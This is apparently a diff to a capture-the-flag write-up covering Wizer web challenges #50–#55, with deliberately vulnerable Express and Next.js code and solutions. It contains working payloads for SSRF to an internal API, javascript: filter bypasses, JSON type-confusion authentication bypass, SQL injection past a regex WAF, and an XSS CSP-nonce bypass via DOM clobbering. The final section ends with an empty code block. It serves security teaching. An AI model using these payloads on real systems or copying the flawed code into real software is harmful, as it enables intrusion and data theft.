@@ -2944,7 +2944,7 @@ OR
 
 
 
-
+<br />
 
 **Debugging code:**
 
@@ -2978,9 +2978,9 @@ if (session && userDatabase[session.username]) {
 
 ```
 
+<br />
 
-
-
+<br />
 
 
 
@@ -3048,12 +3048,666 @@ app.listen(process.env.PORT, () => {
 });
 ```
 
-
+<br />
 
 ```html
 https://chal45-h8f5i.vercel.app/?sid=550e8400-e29b-41d4-a716-446655440000%22%0A%0D%3C/form%3E%3Cimg%20src=x%20onerror=alert(%22Wizer%22)%3E
 
 
 https://chal45-h8f5i.vercel.app/?sid=550e8400-e29b-41d4-a716-446655440000"%0a%0d</form><img src=x onerror=alert("Wizer")>
+```
+
+
+
+<br />
+
+<br />
+
+
+
+### **#50: Preview Websites Metadata**
+
+**Goal:** Uncover the flag by accessing an internal API
+
+**Code:**
+
+```javascript
+import axios from 'axios';
+import * as cheerio from 'cheerio';
+
+export default async function handler(req, res) {
+  const { url } = req.body;
+
+  if (!url || !url.startsWith('http')) {
+    return res.status(400).json({ error: 'Invalid or missing url parameter' });
+  }
+
+  try {
+    // Log the requested URL
+    console.log(`[preview-meta] Fetching: ${url}`);
+
+    // If the URL targets an internal API route, add internal headers
+    const allowInternalHeaders = url.includes('/api/internal/');
+    let headers;
+
+    if(allowInternalHeaders) {
+      headers = { 
+        'x-internal-header': process.env.INTERNAL_HEADER,
+        'x-internal-service': process.env.INTERNAL_SERVICES 
+      }
+      res.setHeader('x-internal-service', process.env.INTERNAL_SERVICES);
+    } else {
+      headers = {};
+    }
+
+    // Perform the request
+    const response = await axios.get(url, {
+      timeout: 3000,
+      headers,
+    });
+
+    const contentType = response.headers['content-type'] || '';
+    const data = response.data;
+
+    // If HTML, parse metadata
+    if (contentType.includes('text/html')) {
+      const $ = cheerio.load(data);
+      const title = $('title').text();
+      const description =
+        $('meta[name="description"]').attr('content') || 'No description';
+
+      return res.status(200).json({ url, title, description });
+    }
+
+    // Otherwise return raw (JSON or plain text)
+    return res.status(200).json({ url, raw: data });
+  } catch (e) {
+    console.error(`[preview-meta] Error fetching URL: ${e.message}`);
+    return res.status(500).json({ error: 'Failed to fetch or parse URL', details: e.message });
+  }
+}
+```
+
+
+
+```
+GET /api/preview-meta
+Content-Type: application/json
+X-Internal-Service: ["user","admin"]
+
+{
+  "url": "http://localhost:32861/api/internal/admin"
+}
+```
+
+Response
+
+```
+{
+  "url": "http://localhost:36277/api/internal/admin",
+  "raw": {
+    "message": "You found the internal service!",
+    "secret": "Wizer{55rf_!nt3rn4l_s3rv1c3}"
+  }
+}
+```
+
+Note: the port number changes. it is in the range (30000 - 40000)
+
+
+
+
+
+
+
+
+
+### **#51:  Menu Level #2**
+
+**Goal:** Inject an alert("Wizer").
+
+**Code:**
+
+```javascript
+import styles from '../styles/Inner.module.css'
+import { useRouter } from 'next/router';
+import React from 'react';
+import Image from 'next/image'
+
+const sanitizeLink = (directLink) => {
+  // prevent XSS (replace case insensitive `javascript` recursively in the URL)
+  let searchMask = "javascript";
+  let regEx = new RegExp(searchMask, "ig");
+
+  while(directLink !== String(directLink).replace(regEx, '')) {
+    directLink = String(directLink).replace(regEx, '');
+  }
+
+  return directLink;
+}
+
+export default function Home() {
+  const router = useRouter();
+  const [isMounted, setIsMounted] = React.useState(false);
+
+  React.useEffect(() => {
+    setIsMounted(true);
+  }, []);
+
+  let { directLink } = router.query;
+  const isDirectLink = typeof directLink === 'string' && directLink.length > 0;
+
+  React.useEffect(() => {
+    if (isMounted && router.isReady && isDirectLink) {
+      directLink = sanitizeLink(directLink);
+      router.push(directLink);
+    }
+  }, [isMounted, router.isReady, isDirectLink]);
+
+  if (!isMounted) return null; // prevent SSR
+
+  return (
+    <main className="text-center mt-5">
+      <h3 className="h3 mb-3 fw-normal">Where do you want to go next?</h3>
+      <h5 className="h5 mb-2 fw-normal" style={{ cursor: 'pointer' }}
+        onClick={() => { router.push("/users") }}>List of Users</h5>
+      <h5 className="h5 mb-2 fw-normal" style={{ cursor: 'pointer' }}
+        onClick={() => { router.push("/groups") }}>List of Groups</h5>
+      <h5 className="h5 mb-2 fw-normal" style={{ cursor: 'pointer' }}
+        onClick={() => { router.push("/profile") }}>Your Profile</h5>
+      <div className={styles.footer}>
+        Powered by <Image src="/wizer.svg"
+          alt="Wizer"
+          width={200}
+          height={100}
+          className={styles.logo} />
+      </div>
+    </main>
+  );
+}
+```
+
+<br />
+
+**Bypass with Tab Character:** (inserts a tab, `%09`, in the middle) or %0a or %0d
+
+```
+https://chal51-diou6.vercel.app/?directLink=java%09script:alert(%27Wizer%27)
+OR
+https://chal51-diou6.vercel.app/?directLink=java%0ascript:alert(%27Wizer%27)
+OR
+https://chal51-diou6.vercel.app/?directLink=java%0dscript:alert(%27Wizer%27)
+```
+
+<br />
+
+Note: it will not work with %00, %20
+
+
+
+<br />
+
+<br />
+
+
+
+
+
+
+
+### **#52:  Admins Secret**
+
+**Goal:** Identify as an admin and get the flag!
+
+**Code:**
+
+```javascript
+import express from 'express';
+import bodyParser from 'body-parser';
+import { config } from 'dotenv';
+config();
+
+const app = express();
+app.use(bodyParser.json());
+
+const users = [
+  { id: 1, username: 'admin', role: 'admin', secret: `${process.env.ADMIN_KEY}` },
+  { id: 2, username: 'user', role: 'user', secret: 'not for you' },
+];
+
+app.post('/secret', (req, res) => {
+  const { user } = req.body;
+  let thisUser; 
+
+  // If 'admin', require a secret
+  if (user.role === 'admin' || user.username === 'admin') {
+    if (user.secret === process.env.ADMIN_KEY) {
+      return res.send(`Welcome, true admin. Here's your flag: ${process.env.FLAG}`);
+    } else {
+      return res.status(403).send('Secret key required for admin access.');
+    }
+  }
+
+  // Get user secret
+  thisUser = users.find(u => u.username == user.username);
+
+  if (thisUser) {
+    return res.status(200).send(`
+        user: ${user.username} 
+        role: ${thisUser.role}
+        secret is: ${thisUser.secret}
+    `);
+  } else {
+    return res.status(403).send('User not found.');
+  }  
+    
+});
+
+app.listen(process.env.PORT, () => {
+  console.log(`CTF running on http://localhost:${process.env.PORT}`);
+});
+```
+
+<br />
+
+
+
+```
+POST /secret
+
+{
+  "user": {
+    "username": [
+      "admin"
+    ]
+  }
+}
+```
+
+response
+
+```
+user: admin 
+role: admin
+secret is: JN98JRTVHU89H458J90JF40590FK450FKL0-L45
+```
+
+<br />
+
+```
+POST /secret
+
+{
+  "user": {
+    "username": "admin",
+    "role": "admin",
+    "secret": "JN98JRTVHU89H458J90JF40590FK450FKL0-L45"
+  }
+}
+```
+
+response
+
+```
+Welcome, true admin. Here's your flag: FLAG{loose_comparison_is_not_secure}
+```
+
+<br />
+
+<br />
+
+<br />
+
+
+
+### #53: Leaky Login Layer
+
+**Goal:** Get the entire list of users with their hashed passwords to win the flag!
+
+**Code:**
+
+```javascript
+import express from 'express';
+import bodyParser from 'body-parser';
+import { seedDatabase } from './seed.mjs';
+import { config } from 'dotenv';
+
+config();
+const app = express();
+app.use(bodyParser.json());
+
+// In-app WAF
+function isMaliciousInput(input) {
+  console.log("Checking input for WAF:", input);
+  const wafRegex = new RegExp(
+    [
+      '(\\b(SELECT|UNION|INSERT|DELETE|UPDATE|DROP|SCRIPT|ALERT|ONERROR|ONLOAD)\\b',
+      '|["();<>\\s]',
+      '|--',
+      '|\\b(AND|OR)\b(?!/\\*\\*\\/))'
+    ].join(''),
+    'i'
+  );
+  return wafRegex.test(input);
+}
+
+app.post('/login', (req, res) => {
+  const userInput = req.body.username;
+
+  if (typeof userInput !== 'string') {
+    return res.status(400).json({ error: "Username must be a string" });
+  }
+
+  if (isMaliciousInput(userInput)) {
+    return res.status(403).json({ message: "❌ Blocked suspicious input by WAF" });
+  }
+
+  seedDatabase((db) => {
+    const query = `SELECT * FROM users WHERE username = '${userInput}'`;
+    console.log("Executing query:", query);
+
+    db.all(query, [], (err, rows) => {
+      if (err) return res.status(500).json({ error: "Database error" });
+
+      if (rows.length > 0) {
+        res.json({ users: rows });
+      } else {
+        res.json({ message: "No user found" });
+      }
+
+      db.close();
+    });
+  });
+});
+
+app.listen(process.env.PORT, () => {
+  console.log(`Web server listening on port ${process.env.PORT}`);
+});
+```
+
+The code builds a single, case-insensitive (`i` flag) regular expression from four main parts. It returns `true` if any of these patterns are found in the `input` string.
+
+1. `'(\\b(SELECT|UNION|INSERT|DELETE|UPDATE|DROP|SCRIPT|ALERT|ONERROR|ONLOAD)\\b'`
+   - This part looks for common **attack keywords**.
+   - `\\b` is a **word boundary**. This ensures it matches the whole word `SELECT` but not a word like `SELECTION`.
+   - `SELECT`, `UNION`, `INSERT`, etc., are common **SQL commands** used in SQLi attacks.
+   - `SCRIPT`, `ALERT`, `ONERROR`, `ONLOAD` are common keywords used in **XSS** payloads.
+2. `'|["();<>\\s]'`
+   - This part looks for individual **special characters** often used in attacks.
+   - `"`: Double quotes (for breaking out of attributes or strings).
+   - `()`: Parentheses (for function calls like `alert(1)` or SQL subqueries).
+   - `;`: Semicolon (for separating SQL statements).
+   - `<>`: Angle brackets (for creating HTML tags like `<script>`).
+   - `\\s`: Any whitespace character (like a space or tab).
+3. `'|--'`
+   - This looks for `--`, which starts a **single-line comment in SQL**. Attackers use this to truncate the original query and inject their own logic (e.g., `' OR 1=1 --`).
+4. `'|\\b(AND|OR)\b(?!/\\*\\*\\/))'`
+   - This is the most complex part. It looks for the words `AND` or `OR`, which are crucial for many SQLi attacks.
+   - `(?!...)` is a **negative lookahead**. It means "match `AND` or `OR` *only if* it is **not** followed by `/**/`".
+
+<br />
+
+```json
+{
+  "username": "test'/**/OR/**/'1"
+}
+```
+
+
+
+<br />
+
+<br />
+
+### #54: Highly Protected Comments
+
+**Goal:** Inject an alert("Wizer").
+
+**Code:**
+
+```javascript
+import express from 'express';
+import { v4 as uuidv4 } from 'uuid';
+
+const app = express();
+const nonce = uuidv4();
+
+app.get('/comment', (req, res) => {
+  const rawComment = req.query.comment || 'No comment provided';
+
+  res.setHeader(
+    'Content-Security-Policy',
+    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; object-src 'none';`
+  );
+
+  // Escape the comment to prevent XSS
+  const escapedComment = rawComment
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+      <head>
+        <title>Comment Viewer</title>
+        <style>
+          body { font-family: sans-serif; padding: 2rem; }
+        </style>
+      </head>
+      <body>
+        <h1>User Comment</h1>
+        <div id="comment">${escapedComment}</div>
+        <div id="debug-zone"></div>
+        <script nonce="${nonce}">
+        window.addEventListener('DOMContentLoaded', () => {
+            // Only allow form elements to be injected for debugging
+            const commentParam = new URLSearchParams(window.location.search).get('comment');
+            if (commentParam) {
+              const decoded = decodeURIComponent(commentParam);
+              // Only inject if it contains a form element (Debugging)
+              if (decoded.includes('<form') && decoded.includes('</form>')) {
+                const debugZone = document.getElementById('debug-zone');
+                debugZone.innerHTML = decoded;
+                
+                // Only execute scripts if debug mode is enabled
+                if (window.isDebugMode) {
+                  const scripts = debugZone.querySelectorAll('script');
+                  scripts.forEach(script => {
+                    // Only execute scripts with the correct nonce
+                    if (script.nonce === '${nonce}') {
+                      // Create a new script element and append it to execute
+                      const newScript = document.createElement('script');
+                      newScript.textContent = script.textContent;
+                      newScript.nonce = script.nonce;
+                      document.body.appendChild(newScript);
+                    }
+                  });
+                }
+              }
+            }
+            
+            // Check if debug mode is enabled
+            if (window.isDebugMode) {
+              console.log('Debug mode is enabled!');
+            }
+          });
+        </script>
+      </body>
+    </html>
+  `);
+});
+
+app.listen(3000, () =>
+  console.log('Vulnerable app running at http://localhost:3000/comment')
+);
+```
+
+<br />
+
+DOM Clobbering and CSP bypass
+
+```
+https://chal54-fiu36s.vercel.app/comment?comment=<form>test</form><a id=isDebugMode><script nonce="1f693b1b-d570-410e-bc5c-80c910fa7ea0">alert("Wizer")</script>
+```
+
+URL encoded:
+
+```
+https://chal54-fiu36s.vercel.app/comment?comment=%3Cform%3Etest%3C/form%3E%3Ca%20id=isDebugMode%3E%3Cscript%20nonce=%221f693b1b-d570-410e-bc5c-80c910fa7ea0%22%3Ealert(%22Wizer%22)%3C/script%3E
+```
+
+
+
+<br />
+
+<br />
+
+
+
+### \#55: Phantom Access
+
+**Goal:** Get the internal report and win the flag!
+
+**Code:**
+
+```javascript
+import dotenv from "dotenv";
+dotenv.config();
+
+import express from "express";
+import crypto from "crypto";
+const app = express();
+app.use(express.json());
+
+const XOR_KEY = crypto.createHash("md5").update("svc-telemetry").digest("hex").slice(0, 12);
+function xorEncode(str, key) {
+  return Buffer.from(
+    [...str].map((char, i) => String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))).join("")
+  ).toString("base64");
+}
+
+const coreCredString = `svc:${Math.floor(Date.now() / 1000)}`;
+const staticSessionToken = Buffer.from(coreCredString).toString("base64");
+
+// Session storage validation
+if (!process.env.SVC_LEGACY_SESSION || !process.env.SYSADMIN_SESSION) {
+  throw new Error("Missing required environment variables: SVC_LEGACY_SESSION or SYSADMIN_SESSION");
+}
+
+const sessionStore = {
+  "alice": crypto.randomUUID(),
+  "bob": crypto.randomUUID(),
+  "svc": staticSessionToken,
+  "svc_legacy": Buffer.from(process.env.SVC_LEGACY_SESSION).toString("base64"),
+  "sysadmin": Buffer.from(process.env.SYSADMIN_SESSION).toString("base64"),
+  "qa_bot": crypto.randomUUID(),
+  "proxy": crypto.randomUUID()
+};
+
+// Simulated user info
+const users = {
+  "alice": { role: "user", info: "Hey Alice!" },
+  "bob": { role: "user", info: "Welcome Bob!" },
+  "svc": { role: "elevated", info: "Internal reports available." },
+  "svc_legacy": { role: "elevated", info: "Deprecated service account." },
+  "sysadmin": { role: "admin", info: "Admin console temporarily locked." },
+  "qa_bot": { role: "automation", info: "QA bot last pinged at 03:42 UTC." },
+  "proxy": { role: "service", info: "Proxy gateway ready." }
+};
+
+// Trace logger
+function traceLookup(username) {
+  const entry = {
+    query: username,
+    timestamp: Date.now()
+  };
+
+  if (username.match(/^testd+$/)) {
+    entry.context = "test-trace";
+    entry.debug = `traceId:${crypto.randomBytes(4).toString("hex")}`;
+  }
+
+  if (username.includes("debug") || username.length > 25) {
+    entry.context = "log-overflow";
+    entry.trace = `bytes:${username.length}`;
+  }
+
+  if (username.includes("root") || username.includes("sys")) {
+    entry.context = "sys-audit";
+    entry.note = `tracer:${Buffer.from("noop").toString("base64")}`;
+  }
+
+  if (username.includes("proxy") || username.includes("qa")) {
+    entry.context = "legacy-auth-check";
+    entry.trace = `fallbackToken:${Buffer.from("validate:proxy").toString("hex")}`;
+  }
+
+  if (username.includes("svc") || username.includes("%00")) {
+    entry.context = "fallback-user-lookup";
+    entry.note = `tracer:${xorEncode(coreCredString, XOR_KEY)}`;
+  }
+
+  return entry;
+}
+
+// Main endpoint - profile lookup
+app.get("/api/profile", (req, res) => {
+  const username = req.query.user;
+  if (!username) {
+    return res.status(400).json({ error: "Missing user parameter." });
+  }
+
+  const user = users[username];
+  if (!user) {
+    return res.status(404).json({
+      error: "User not found",
+      metadata: traceLookup(username)
+    });
+  }
+
+  res.json({
+    status: "ok",
+    user: username,
+    info: user.info
+  });
+});
+
+app.post("/api/internal-report", (req, res) => {
+  const sessionId = req.body.xSessionId;
+  if (sessionId && sessionId === sessionStore.svc) {
+    return res.json({
+      status: "success",
+      report: {
+        metrics: {
+          daily: [125, 117, 140],
+          notes: {
+            internal_summary: process.env.LAST_SUMMARY
+          }
+        }
+      }
+    });
+  }
+
+  return res.status(403).json({ error: "Access denied." });
+});
+
+app.get("/", (req, res) => {
+  res.send(`
+    <h2>Welcome</h2>
+    <p>Try out the <code>/api/profile?user=USERNAME</code> endpoint.</p>
+  `);
+});
+
+app.listen(process.env.PORT, () => {
+  console.log(`Challenge running on http://localhost:${process.env.PORT || 4000}`);
+});
+```
+
+<br />
+
+```
 ```
 
